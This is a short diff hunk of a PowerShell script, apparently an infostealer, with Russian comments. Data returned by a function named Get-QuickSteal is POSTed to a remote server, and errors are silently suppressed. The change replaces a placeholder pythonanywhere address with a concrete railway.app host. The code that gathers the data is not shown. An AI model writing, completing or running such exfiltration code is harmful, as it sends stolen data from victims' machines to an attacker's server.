@@ -55,7 +55,7 @@ function Get-QuickSteal {
 $data = Get-QuickSteal
 
 # Отправка на твой Python-сервер
-$uri = "https://твой-домен.pythonanywhere.com/receive"   # ← замени на свой URL
+$uri = "http://serv-production-40e7.up.railway.app"   # ← замени на свой URL
 try {
     Invoke-WebRequest -Uri $uri -Method POST -Body $data -ContentType "application/json" -TimeoutSec 12
 } catch {}
